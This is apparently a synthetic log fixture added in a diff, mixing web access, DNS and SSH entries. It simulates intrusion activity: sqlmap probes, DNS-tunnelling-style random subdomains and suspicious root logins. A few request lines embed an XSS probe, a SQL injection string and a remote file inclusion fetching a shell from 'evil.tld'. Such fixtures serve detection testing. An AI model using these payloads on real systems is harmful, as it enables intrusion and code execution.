@@ -1,0 +1,178 @@
+134.190.216.242 - - [21/Aug/2025:09:06:52 +0000] "POST / HTTP/1.1" 404 3317 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+179.33.112.90 - - [21/Aug/2025:09:06:52 +0000] "HEAD / HTTP/1.1" 200 2361 "-" "Mozilla/5.0 (X11; Linux x86_64)"
+Aug 21 09:06:52 dns01 named[222]: client 79.65.184.122#53: query: 800cjgsvx7u9kmrqv1aqrzn5uhdrhmq6rzdm.github.com IN A + (127.0.0.1)
+Aug 21 09:06:52 dns01 named[222]: client 29.194.17.79#53: query: mef7idujx3i4a9de8h4322turl19dr94r3bkrtf.corp.local IN A + (127.0.0.1)
+117.178.116.248 - - [21/Aug/2025:09:06:53 +0000] "POST /api/v1/items?q=onerror=alert(1) HTTP/1.1" 200 1661 "-" "Go-http-client/1.1"
+75.28.156.64 - - [21/Aug/2025:09:06:54 +0000] "HEAD /search HTTP/1.1" 500 2524 "-" "Wget/1.21.4"
+Aug 21 09:06:54 dns01 named[222]: client 129.38.54.196#53: query: 31fi8yuob4ip5giiyrpy53do6kqacohlrhw.github.com IN A + (127.0.0.1)
+27.88.233.248 - - [21/Aug/2025:09:06:54 +0000] "HEAD /index.php HTTP/1.1" 500 631 "-" "Wget/1.21.4"
+Aug 21 09:06:55 dns01 named[222]: client 95.133.213.191#53: query: cfnd2l9udv9x4ui285ik65.corp.local IN A + (127.0.0.1)
+Aug 21 09:06:56 web01 sshd[1234]: Accepted password for postgres from 111.142.65.178 port 23858 ssh2
+73.209.58.41 - - [21/Aug/2025:09:06:56 +0000] "POST /index.php HTTP/1.1" 302 2015 "https://updates.microsoft.com/index.php" "Wget/1.21.4"
+136.185.148.205 - - [21/Aug/2025:09:06:56 +0000] "HEAD / HTTP/1.1" 200 1638 "-" "Go-http-client/1.1"
+Aug 21 09:06:56 dns01 named[222]: client 160.54.81.9#53: query: a0dqumfp8u5fmijatm49aeijgtm3sqbsz4bkfvu5vq1yr.internal.svc IN A + (127.0.0.1)
+Aug 21 09:06:57 dns01 named[222]: client 11.255.49.140#53: query: g8ycvxuwkjhnfx98n6oyevmtinomb2t4.github.com IN A + (127.0.0.1)
+Aug 21 09:06:58 dns01 named[222]: client 65.21.201.205#53: query: 0jxmut2nmd96ieeqn79b4q3y8afc3ki4eskr.corp.local IN A + (127.0.0.1)
+126.148.10.5 - - [21/Aug/2025:09:06:58 +0000] "HEAD /index.php HTTP/1.1" 200 1298 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+Aug 21 09:06:58 dns01 named[222]: client 128.155.163.68#53: query: r2omclu7jby42kdhva4qq0z20t017d0qvpiwqi37j.example.com IN A + (127.0.0.1)
+8.130.34.213 - - [21/Aug/2025:09:06:58 +0000] "POST /admin HTTP/1.1" 200 375 "-" "sqlmap/1.7.10"
+74.30.190.90 - - [21/Aug/2025:09:06:59 +0000] "HEAD /login HTTP/1.1" 302 2181 "-" "curl/8.0.1"
+5.99.193.16 - - [21/Aug/2025:09:06:59 +0000] "POST /index.php HTTP/1.1" 200 526 "-" "Mozilla/5.0 (X11; Linux x86_64)"
+Aug 21 09:07:00 web01 sshd[1234]: Accepted password for oracle from 57.132.77.33 port 26435 ssh2
+Aug 21 09:07:01 dns01 named[222]: client 133.78.142.148#53: query: jsch3qk6kyyneludvvxphb0003cs13aidd68z4d.internal.svc IN A + (127.0.0.1)
+Aug 21 09:07:01 dns01 named[222]: client 178.145.121.61#53: query: 2un5he6zgamrqu67kuvjnc9vu4xhc92wtq6z8c2w.example.com IN A + (127.0.0.1)
+168.127.126.247 - - [21/Aug/2025:09:07:01 +0000] "POST /search HTTP/1.1" 500 604 "https://corp.local/wp-login.php" "Wget/1.21.4"
+Aug 21 09:07:02 dns01 named[222]: client 20.146.95.119#53: query: 40jk7pvbeex8qikfkzwp.corp.local IN A + (127.0.0.1)
+Aug 21 09:07:03 dns01 named[222]: client 110.155.110.106#53: query: hwuwbk3q9klidww35riwjz.github.com IN A + (127.0.0.1)
+Aug 21 09:07:03 dns01 named[222]: client 127.167.77.167#53: query: 9nn4rxtc3yyvsu56xavvwiuz4a04wqw.corp.local IN A + (127.0.0.1)
+88.130.68.143 - - [21/Aug/2025:09:07:03 +0000] "HEAD /?id=1 HTTP/1.1" 403 2756 "-" "curl/8.0.1"
+Aug 21 09:07:04 dns01 named[222]: client 195.53.178.149#53: query: 6h8rm56idn8yg3gupaia2o3847lb79xphnf91.updates.microsoft.com IN A + (127.0.0.1)
+Aug 21 09:07:04 dns01 named[222]: client 24.135.220.70#53: query: fqgbqfmtqhc75attxbaz03fk9xlww.github.com IN A + (127.0.0.1)
+103.66.129.192 - - [21/Aug/2025:09:07:04 +0000] "POST /admin HTTP/1.1" 500 1396 "-" "Go-http-client/1.1"
+Aug 21 09:07:04 dns01 named[222]: client 13.61.210.104#53: query: laq9joy9s4bwsqt8cs04uqnp82c1.corp.local IN A + (127.0.0.1)
+Aug 21 09:07:05 web01 sshd[1234]: Accepted password for postgres from 150.140.156.169 port 19528 ssh2
+Aug 21 09:07:05 dns01 named[222]: client 116.116.162.206#53: query: g9w6aym5j2lzchzrfshzgc8k28viactvdo0d7nzk.internal.svc IN A + (127.0.0.1)
+Aug 21 09:07:06 dns01 named[222]: client 29.248.170.165#53: query: nu9uvdrgj0s282iq1tw1mt1jb.github.com IN A + (127.0.0.1)
+Aug 21 09:07:06 web01 sshd[1234]: Accepted password for oracle from 188.117.199.56 port 42640 ssh2
+Aug 21 09:07:07 dns01 named[222]: client 72.176.3.216#53: query: 06jzlwtz7rxfijc6egjnvzbbciw6eswqlf1.internal.svc IN A + (127.0.0.1)
+Aug 21 09:07:07 web01 sshd[1234]: Accepted password for ubuntu from 218.51.194.104 port 24195 ssh2
+Aug 21 09:07:07 dns01 named[222]: client 203.88.176.139#53: query: 33gg81eo05fx3m7l37x9.updates.microsoft.com IN A + (127.0.0.1)
+Aug 21 09:07:07 dns01 named[222]: client 124.64.33.246#53: query: 99usrfx1qreto39t11iek0j8ssp93ej1ysdj7.internal.svc IN A + (127.0.0.1)
+Aug 21 09:07:08 web01 sshd[1234]: Accepted password for root from 30.28.11.96 port 10677 ssh2
+49.221.176.240 - - [21/Aug/2025:09:07:09 +0000] "POST /wp-login.php?q=onerror=alert(1) HTTP/1.1" 404 870 "-" "sqlmap/1.7.10"
+189.19.55.96 - - [21/Aug/2025:09:07:09 +0000] "POST / HTTP/1.1" 200 292 "-" "Wget/1.21.4"
+Aug 21 09:07:09 dns01 named[222]: client 204.243.7.36#53: query: 869pqfa9ofx0uz76f1wwhsbysma1zx5158uffm.updates.microsoft.com IN A + (127.0.0.1)
+Aug 21 09:07:10 dns01 named[222]: client 211.239.106.110#53: query: 1x70t9o96k9nxv8lhr9aoe4rzmqsyo587lkukthv1dg1g.corp.local IN A + (127.0.0.1)
+Aug 21 09:07:10 dns01 named[222]: client 169.137.207.247#53: query: sayohdabf2gx2q69z9tyu7kdyuv1.example.com IN A + (127.0.0.1)
+Aug 21 09:07:11 dns01 named[222]: client 123.128.249.174#53: query: l9h8j2srqjrqv7wgi9j0y3ul2gb.example.com IN A + (127.0.0.1)
+Aug 21 09:07:11 dns01 named[222]: client 36.246.135.42#53: query: 1ns8oj7e45igrr2rbx7mvz5i61sh5ai0g.corp.local IN A + (127.0.0.1)
+Aug 21 09:07:11 dns01 named[222]: client 154.171.227.183#53: query: uf5t0y4larwx7dzb9aq2zny3o.corp.local IN A + (127.0.0.1)
+Aug 21 09:07:11 dns01 named[222]: client 164.179.215.5#53: query: gbj6aksiqlmf4vz09aq1t.updates.microsoft.com IN A + (127.0.0.1)
+140.132.12.117 - - [21/Aug/2025:09:07:12 +0000] "HEAD /?id=1 HTTP/1.1" 200 1100 "https://cdn.example.net/admin" "curl/8.0.1"
+Aug 21 09:07:12 dns01 named[222]: client 65.174.46.63#53: query: edp86i3s3h4xm2lui7s4rxu78sgpzkrudzezaoov.example.com IN A + (127.0.0.1)
+Aug 21 09:07:12 dns01 named[222]: client 138.109.205.47#53: query: ty4v5lczr0x7nt48fxdjtr5m4ni.github.com IN A + (127.0.0.1)
+Aug 21 09:07:12 web01 sshd[1234]: Accepted password for oracle from 204.184.15.88 port 41919 ssh2
+Aug 21 09:07:13 web01 sshd[1234]: Accepted password for admin from 47.131.165.171 port 27839 ssh2
+32.152.184.37 - - [21/Aug/2025:09:07:13 +0000] "POST /search HTTP/1.1" 403 1554 "https://updates.microsoft.com/search" "Wget/1.21.4"
+134.111.207.103 - - [21/Aug/2025:09:07:13 +0000] "POST /?id=1 HTTP/1.1" 302 3761 "-" "Wget/1.21.4"
+Aug 21 09:07:14 dns01 named[222]: client 94.116.84.19#53: query: dn2h6c8igyfn4zrl3l7sx8q70wnthjtm65.internal.svc IN A + (127.0.0.1)
+Aug 21 09:07:14 dns01 named[222]: client 60.198.197.67#53: query: 6z67m0cxenhd6aloxq28ran2ayd.github.com IN A + (127.0.0.1)
+Aug 21 09:07:14 dns01 named[222]: client 62.245.20.209#53: query: 24ml1x8w2uwfaq5arj0czb8rvpl65mbkv5ejoqo0j.internal.svc IN A + (127.0.0.1)
+Aug 21 09:07:15 dns01 named[222]: client 143.69.69.186#53: query: vlqe7yxba1he0jii6a57t7ahiwtg8n0oim.example.com IN A + (127.0.0.1)
+Aug 21 09:07:16 dns01 named[222]: client 30.169.51.118#53: query: 2gdcdwmx3oyjtjv35d1eyqcshkp8rjy61j3vb.internal.svc IN A + (127.0.0.1)
+Aug 21 09:07:16 dns01 named[222]: client 81.39.137.4#53: query: 9nhzgs7u3w14yrlw4qj8p3.updates.microsoft.com IN A + (127.0.0.1)
+Aug 21 09:07:16 dns01 named[222]: client 120.23.92.108#53: query: bhvgwro69l840q3s7cksyx0v2lhxgwzc26isi.corp.local IN A + (127.0.0.1)
+28.145.70.216 - - [21/Aug/2025:09:07:16 +0000] "POST /wp-login.php HTTP/1.1" 200 3360 "https://example.com/admin" "Mozilla/5.0 (X11; Linux x86_64)"
+2.206.115.250 - - [21/Aug/2025:09:07:17 +0000] "HEAD /api/v1/items HTTP/1.1" 403 3192 "-" "Wget/1.21.4"
+Aug 21 09:07:17 dns01 named[222]: client 79.40.215.189#53: query: rdm68ua0m4c18l652iy2ko.corp.local IN A + (127.0.0.1)
+221.72.125.151 - - [21/Aug/2025:09:07:17 +0000] "HEAD /api/v1/items HTTP/1.1" 404 2095 "-" "Wget/1.21.4"
+Aug 21 09:07:18 web01 sshd[1234]: Accepted password for ubuntu from 119.82.205.135 port 40723 ssh2
+74.49.8.241 - - [21/Aug/2025:09:07:18 +0000] "HEAD /wp-login.php HTTP/1.1" 500 1882 "-" "curl/8.0.1"
+Aug 21 09:07:19 web01 sshd[1234]: Accepted password for oracle from 190.199.218.182 port 53125 ssh2
+Aug 21 09:07:19 dns01 named[222]: client 131.61.99.227#53: query: dtekir5w7pve39say1fiidpfdv6so.github.com IN A + (127.0.0.1)
+Aug 21 09:07:19 dns01 named[222]: client 148.237.12.0#53: query: d1wyi35aj8idgm728mvwknn76b9bc.github.com IN A + (127.0.0.1)
+151.65.57.25 - - [21/Aug/2025:09:07:20 +0000] "HEAD /wp-login.php HTTP/1.1" 302 1044 "https://updates.microsoft.com/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+Aug 21 09:07:20 dns01 named[222]: client 48.119.188.254#53: query: 9wtdbap17uk1k7bfvao076lv6pcers.example.com IN A + (127.0.0.1)
+Aug 21 09:07:21 dns01 named[222]: client 68.192.95.253#53: query: wbgeq0vq4x3fe956jbtb6zhateyswcw08a071wic.corp.local IN A + (127.0.0.1)
+Aug 21 09:07:22 dns01 named[222]: client 80.166.5.168#53: query: e51jn4ziz9j5251esnqdj98wya3er.example.com IN A + (127.0.0.1)
+Aug 21 09:07:22 dns01 named[222]: client 51.109.19.168#53: query: b9y78etf0km5zqe5gg408qnj8237e6wm2ht.corp.local IN A + (127.0.0.1)
+Aug 21 09:07:23 dns01 named[222]: client 103.54.205.136#53: query: sp0nbxud249831fz9bsh8b4h70r6k3e4tcg7r9l5.corp.local IN A + (127.0.0.1)
+176.208.112.85 - - [21/Aug/2025:09:07:23 +0000] "POST /wp-login.php HTTP/1.1" 200 1376 "-" "Wget/1.21.4"
+Aug 21 09:07:24 dns01 named[222]: client 206.119.110.150#53: query: sievoay25fp9whpijkqb8rhmz7qq0.github.com IN A + (127.0.0.1)
+Aug 21 09:07:24 dns01 named[222]: client 145.248.169.85#53: query: ykgz2lq4p2wcweodmjxlu3s9580dazx4eina3kltyb.updates.microsoft.com IN A + (127.0.0.1)
+Aug 21 09:07:25 web01 sshd[1234]: Accepted password for oracle from 132.60.129.142 port 30352 ssh2
+162.137.241.80 - - [21/Aug/2025:09:07:25 +0000] "HEAD /admin HTTP/1.1" 302 2544 "-" "Wget/1.21.4"
+Aug 21 09:07:25 dns01 named[222]: client 183.153.131.208#53: query: 4q67je2wuni6qktr50jaoa7mowlindh.example.com IN A + (127.0.0.1)
+Aug 21 09:07:26 web01 sshd[1234]: Accepted password for postgres from 204.140.35.61 port 64458 ssh2
+Aug 21 09:07:26 web01 sshd[1234]: Accepted password for test from 154.31.161.137 port 50160 ssh2
+Aug 21 09:07:26 dns01 named[222]: client 147.130.82.114#53: query: p0yckvdjzkwukt4j5yrb2wgnmlm9wrbdo3jr.github.com IN A + (127.0.0.1)
+42.63.165.53 - - [21/Aug/2025:09:07:27 +0000] "POST /wp-login.php HTTP/1.1" 200 3955 "-" "Go-http-client/1.1"
+55.102.21.196 - - [21/Aug/2025:09:07:27 +0000] "HEAD /search HTTP/1.1" 200 1107 "-" "curl/8.0.1"
+138.163.84.29 - - [21/Aug/2025:09:07:27 +0000] "POST /admin HTTP/1.1" 302 1975 "-" "curl/8.0.1"
+96.115.96.122 - - [21/Aug/2025:09:07:27 +0000] "POST /wp-login.php HTTP/1.1" 500 603 "-" "sqlmap/1.7.10"
+83.180.48.61 - - [21/Aug/2025:09:07:27 +0000] "HEAD /admin HTTP/1.1" 200 1932 "https://updates.microsoft.com/" "sqlmap/1.7.10"
+Aug 21 09:07:27 dns01 named[222]: client 217.103.250.208#53: query: vc99gjcznrdqqq4ob4dr.corp.local IN A + (127.0.0.1)
+5.30.183.202 - - [21/Aug/2025:09:07:28 +0000] "POST /api/v1/items HTTP/1.1" 200 1791 "-" "Go-http-client/1.1"
+Aug 21 09:07:28 dns01 named[222]: client 182.14.115.119#53: query: 1pkcc8v9kytkquy4fo8wkbt0owbiwitdv7tk3noym7.corp.local IN A + (127.0.0.1)
+Aug 21 09:07:29 dns01 named[222]: client 27.168.235.100#53: query: ukurms8zyad2xk75qe62.corp.local IN A + (127.0.0.1)
+Aug 21 09:07:29 dns01 named[222]: client 146.215.53.227#53: query: mrwlftjwxfwtdj5x6rnlp7.github.com IN A + (127.0.0.1)
+Aug 21 09:07:29 dns01 named[222]: client 171.250.46.216#53: query: qgr3gc4lut49la0gwabngc.updates.microsoft.com IN A + (127.0.0.1)
+Aug 21 09:07:30 dns01 named[222]: client 14.201.55.108#53: query: 876kizzts9ure1prburuv4zcs1is66wvys1hjuuzyd.internal.svc IN A + (127.0.0.1)
+185.139.208.229 - - [21/Aug/2025:09:07:30 +0000] "HEAD / HTTP/1.1" 200 2056 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+Aug 21 09:07:30 dns01 named[222]: client 216.32.167.144#53: query: vwix4tvy6npei7kke6vubs4ypfv1ki.github.com IN A + (127.0.0.1)
+Aug 21 09:07:30 dns01 named[222]: client 211.199.135.138#53: query: juwgxp24j30urncaah4x418nxbr.corp.local IN A + (127.0.0.1)
+Aug 21 09:07:30 web01 sshd[1234]: Accepted password for admin from 111.11.116.166 port 47064 ssh2
+Aug 21 09:07:31 dns01 named[222]: client 68.8.55.51#53: query: p70ldnlwlu6c5trnh3raf75kngt6di51almfyua2wrgo.example.com IN A + (127.0.0.1)
+Aug 21 09:07:32 dns01 named[222]: client 137.130.56.81#53: query: u0xg7cebb9d5ugpaus453amo9w.github.com IN A + (127.0.0.1)
+Aug 21 09:07:32 web01 sshd[1234]: Accepted password for ubuntu from 168.0.51.246 port 17069 ssh2
+88.192.152.5 - - [21/Aug/2025:09:07:32 +0000] "HEAD / HTTP/1.1" 403 1262 "https://updates.microsoft.com/login" "Mozilla/5.0 (X11; Linux x86_64)"
+Aug 21 09:07:33 web01 sshd[1234]: Accepted password for oracle from 128.56.79.189 port 36585 ssh2
+Aug 21 09:07:33 dns01 named[222]: client 133.119.187.217#53: query: 4ipwi120ozkky7qbe286aew.example.com IN A + (127.0.0.1)
+Aug 21 09:07:33 dns01 named[222]: client 175.124.115.236#53: query: r1jmwi2kbyaqsijx6dn0e3yomwo0m1th4i7fw.updates.microsoft.com IN A + (127.0.0.1)
+Aug 21 09:07:33 dns01 named[222]: client 52.197.126.226#53: query: ip8iuvr0q364hu15ullx7drmlsb5.internal.svc IN A + (127.0.0.1)
+Aug 21 09:07:34 dns01 named[222]: client 167.254.253.211#53: query: l8f4ckp33y4cibsf8rarm4.corp.local IN A + (127.0.0.1)
+Aug 21 09:07:34 dns01 named[222]: client 131.236.91.99#53: query: 8lg01jp1rwodjprwgg6nj73j.updates.microsoft.com IN A + (127.0.0.1)
+Aug 21 09:07:34 dns01 named[222]: client 87.201.121.212#53: query: qag86y646qpcnlof93jlh.internal.svc IN A + (127.0.0.1)
+Aug 21 09:07:34 dns01 named[222]: client 13.107.33.133#53: query: 93453onry2alou9agflu99858tsemywv44w681xbr.corp.local IN A + (127.0.0.1)
+Aug 21 09:07:34 dns01 named[222]: client 174.107.195.102#53: query: wvii6eqwg1raxdjuk6j60gcj3tq0nwpm4irnc.example.com IN A + (127.0.0.1)
+Aug 21 09:07:36 dns01 named[222]: client 98.24.52.168#53: query: vwib6sjl0rjkpbnvh3y5a13heikml3.github.com IN A + (127.0.0.1)
+Aug 21 09:07:36 dns01 named[222]: client 110.234.224.53#53: query: 0es1b66xxhprq5ool7b0upw7blnx616amcdmt3rn42.github.com IN A + (127.0.0.1)
+Aug 21 09:07:36 dns01 named[222]: client 82.183.211.94#53: query: n9lghgm97weg5ib0naaa5d9dn6.example.com IN A + (127.0.0.1)
+146.138.21.156 - - [21/Aug/2025:09:07:37 +0000] "HEAD /?id=1 HTTP/1.1" 200 155 "-" "sqlmap/1.7.10"
+95.223.149.157 - - [21/Aug/2025:09:07:37 +0000] "POST /wp-login.php HTTP/1.1" 200 3486 "https://updates.microsoft.com/api/v1/items" "Wget/1.21.4"
+Aug 21 09:07:38 dns01 named[222]: client 35.238.101.125#53: query: fk31ub337l2r20bgbeug5io4h345v.corp.local IN A + (127.0.0.1)
+161.26.246.255 - - [21/Aug/2025:09:07:38 +0000] "POST /login HTTP/1.1" 404 675 "-" "Go-http-client/1.1"
+Aug 21 09:07:38 dns01 named[222]: client 2.179.92.248#53: query: 94lfguzlvub0sx1433vlm.updates.microsoft.com IN A + (127.0.0.1)
+199.218.90.204 - - [21/Aug/2025:09:07:39 +0000] "HEAD /wp-login.php HTTP/1.1" 403 2788 "-" "curl/8.0.1"
+93.247.226.155 - - [21/Aug/2025:09:07:39 +0000] "POST /login HTTP/1.1" 403 3220 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+Aug 21 09:07:40 dns01 named[222]: client 64.33.165.157#53: query: 88nstwwj1jtz0mo8f8lgs78anx.updates.microsoft.com IN A + (127.0.0.1)
+Aug 21 09:07:40 dns01 named[222]: client 58.97.238.84#53: query: xxgh2dlbjmdd8y7jh3cyoz08.github.com IN A + (127.0.0.1)
+131.19.234.109 - - [21/Aug/2025:09:07:40 +0000] "POST /admin HTTP/1.1" 404 2412 "-" "Mozilla/5.0 (X11; Linux x86_64)"
+Aug 21 09:07:40 web01 sshd[1234]: Accepted password for postgres from 62.50.31.38 port 38941 ssh2
+89.105.112.103 - - [21/Aug/2025:09:07:41 +0000] "POST /api/v1/items HTTP/1.1" 200 1456 "https://cdn.example.net/" "curl/8.0.1"
+103.48.118.190 - - [21/Aug/2025:09:07:41 +0000] "HEAD /?id=1 HTTP/1.1" 403 3406 "https://updates.microsoft.com/search" "Go-http-client/1.1"
+117.71.2.229 - - [21/Aug/2025:09:07:42 +0000] "POST /?id=1 HTTP/1.1" 200 3625 "https://github.com/?id=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+Aug 21 09:07:42 dns01 named[222]: client 83.226.170.201#53: query: shff6gp7lmsb1kifa13rms0xovyvl8.example.com IN A + (127.0.0.1)
+72.181.181.241 - - [21/Aug/2025:09:07:42 +0000] "POST /api/v1/items HTTP/1.1" 403 3263 "-" "sqlmap/1.7.10"
+Aug 21 09:07:42 dns01 named[222]: client 158.40.83.150#53: query: i177lc0l4gpufh4wywgznm3raj6i7esx3bz152brnc.internal.svc IN A + (127.0.0.1)
+Aug 21 09:07:43 dns01 named[222]: client 88.156.162.155#53: query: isr7tor823if663fji79p4x5.updates.microsoft.com IN A + (127.0.0.1)
+Aug 21 09:07:43 dns01 named[222]: client 183.50.80.78#53: query: jix1zmu93xsjpv4j0v85sxupyfvspets.updates.microsoft.com IN A + (127.0.0.1)
+181.252.179.98 - - [21/Aug/2025:09:07:43 +0000] "POST /login HTTP/1.1" 403 611 "https://github.com/search" "sqlmap/1.7.10"
+124.245.249.92 - - [21/Aug/2025:09:07:43 +0000] "POST /search HTTP/1.1" 200 534 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+Aug 21 09:07:43 web01 sshd[1234]: Accepted password for root from 113.214.92.193 port 30740 ssh2
+200.115.75.102 - - [21/Aug/2025:09:07:44 +0000] "POST /api/v1/items HTTP/1.1" 200 1382 "https://updates.microsoft.com/api/v1/items" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+73.53.218.131 - - [21/Aug/2025:09:07:44 +0000] "POST /search HTTP/1.1" 403 3755 "-" "Go-http-client/1.1"
+186.249.239.2 - - [21/Aug/2025:09:07:44 +0000] "HEAD /api/v1/items HTTP/1.1" 200 3583 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+107.178.247.194 - - [21/Aug/2025:09:07:44 +0000] "POST / HTTP/1.1" 500 2451 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+205.205.209.207 - - [21/Aug/2025:09:07:45 +0000] "POST /wp-login.php HTTP/1.1" 200 3834 "-" "sqlmap/1.7.10"
+Aug 21 09:07:45 web01 sshd[1234]: Accepted password for postgres from 31.179.21.214 port 24707 ssh2
+Aug 21 09:07:46 web01 sshd[1234]: Accepted password for ubuntu from 196.213.26.105 port 20697 ssh2
+Aug 21 09:07:46 dns01 named[222]: client 59.15.117.190#53: query: zeib0097zg93jt3zq2y6tr5jq22v.corp.local IN A + (127.0.0.1)
+Aug 21 09:07:47 dns01 named[222]: client 131.253.217.136#53: query: yvyzlfdryarlvoo4vj3y.corp.local IN A + (127.0.0.1)
+Aug 21 09:07:48 dns01 named[222]: client 196.211.246.240#53: query: b3dhacrmwbrdbphw9wyu1trf.corp.local IN A + (127.0.0.1)
+63.135.14.213 - - [21/Aug/2025:09:07:48 +0000] "POST /login HTTP/1.1" 403 2607 "https://updates.microsoft.com/index.php" "sqlmap/1.7.10"
+Aug 21 09:07:48 dns01 named[222]: client 99.154.58.221#53: query: af3bipg2cla0cu1blmwziz5wwjr333fj7hwoxd8q.github.com IN A + (127.0.0.1)
+Aug 21 09:07:48 dns01 named[222]: client 70.25.228.26#53: query: enxddb63939h2857q5pnetpnl1yy88ad763sy54n.corp.local IN A + (127.0.0.1)
+176.122.253.24 - - [21/Aug/2025:09:07:49 +0000] "POST /api/v1/items HTTP/1.1" 404 3497 "-" "Go-http-client/1.1"
+Aug 21 09:07:49 dns01 named[222]: client 172.249.147.129#53: query: v03s7me9wyjq0v8cnku21n0nf.updates.microsoft.com IN A + (127.0.0.1)
+131.151.109.148 - - [21/Aug/2025:09:07:49 +0000] "POST /wp-login.php HTTP/1.1" 200 3352 "https://github.com/index.php" "Wget/1.21.4"
+Aug 21 09:07:49 dns01 named[222]: client 175.42.148.9#53: query: wr81c9t64gom5felpjmlsdtur67k1bx2xz7ga.example.com IN A + (127.0.0.1)
+Aug 21 09:07:50 dns01 named[222]: client 211.21.33.211#53: query: 2ipp42p8vgl2rcrscwb64ffiyoa6usfhrmy99ezcy.github.com IN A + (127.0.0.1)
+Aug 21 09:07:51 dns01 named[222]: client 51.210.205.163#53: query: 3gq08bie2kqgbl7zipu99713ukuqh011k2.updates.microsoft.com IN A + (127.0.0.1)
+171.188.6.45 - - [21/Aug/2025:09:07:51 +0000] "POST /api/v1/items?q=' OR '1'='1 HTTP/1.1" 200 2293 "-" "Mozilla/5.0 (X11; Linux x86_64)"
+26.7.15.178 - - [21/Aug/2025:09:07:51 +0000] "HEAD / HTTP/1.1" 500 3835 "-" "Mozilla/5.0 (X11; Linux x86_64)"
+Aug 21 09:07:52 dns01 named[222]: client 124.65.57.115#53: query: jy0ohv7eewsx71ph91sey0oujtelw.updates.microsoft.com IN A + (127.0.0.1)
+211.177.30.54 - - [21/Aug/2025:09:07:52 +0000] "POST / HTTP/1.1" 403 555 "https://github.com/api/v1/items" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+14.119.49.74 - - [21/Aug/2025:09:07:52 +0000] "POST /?id=1 HTTP/1.1" 200 3506 "-" "curl/8.0.1"
+12.138.212.185 - - [21/Aug/2025:09:07:52 +0000] "POST /wp-login.php?q=file=http://evil.tld/shell.txt HTTP/1.1" 500 2939 "-" "sqlmap/1.7.10"
+177.188.94.169 - - [21/Aug/2025:09:07:53 +0000] "HEAD / HTTP/1.1" 500 3676 "https://cdn.example.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+181.142.189.71 - - [21/Aug/2025:09:07:53 +0000] "HEAD /api/v1/items HTTP/1.1" 200 3913 "https://internal.svc/login" "Mozilla/5.0 (X11; Linux x86_64)"
+Aug 21 09:07:53 dns01 named[222]: client 204.29.42.54#53: query: x9w5t33npvxvggs1xlow9g3yziy.github.com IN A + (127.0.0.1)
+Aug 21 09:07:53 dns01 named[222]: client 168.247.50.100#53: query: dblew7wrk3zjowjxrfs9xlmlh.updates.microsoft.com IN A + (127.0.0.1)
+3.99.85.196 - - [21/Aug/2025:09:07:54 +0000] "POST /login HTTP/1.1" 404 302 "-" "Go-http-client/1.1"
+Aug 21 09:07:54 web01 sshd[1234]: Accepted password for oracle from 85.18.119.84 port 61886 ssh2
+12.5.208.238 - - [21/Aug/2025:09:07:54 +0000] "HEAD /admin HTTP/1.1" 200 3057 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+Aug 21 09:07:54 dns01 named[222]: client 102.86.29.184#53: query: zpm9smwsgielli8h5mzrzvwo9dk7h4yoidztwrnfrs.example.com IN A + (127.0.0.1)
+Aug 21 09:07:54 dns01 named[222]: client 205.177.76.173#53: query: w82kx4vprwys8tecv64pyd33ft894xqvdhwo51x336.corp.local IN A + (127.0.0.1)
+Aug 21 09:07:55 dns01 named[222]: client 123.219.123.144#53: query: 7ybd8l1rzan6rwswh1o1uzx1cv0hfhp2.corp.local IN A + (127.0.0.1)
+Aug 21 09:07:55 dns01 named[222]: client 20.107.116.217#53: query: 0ex8q0ct823iu9jw49czxztgiy1737yo0jb.updates.microsoft.com IN A + (127.0.0.1)
